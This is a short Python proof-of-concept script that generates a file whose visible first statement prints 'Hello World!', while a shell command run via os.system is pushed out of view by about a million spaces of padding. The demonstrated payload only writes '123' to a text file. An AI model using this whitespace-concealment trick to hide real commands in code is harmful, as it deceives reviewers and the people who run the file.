first_command = """print("Hello World!")"""
payload = """; import os ; os.system("echo 123 > hello.txt")"""
padding = ""
for i in range(100_0000): padding += " "
open("PoC.py", "w").write(first_command + padding + payload)
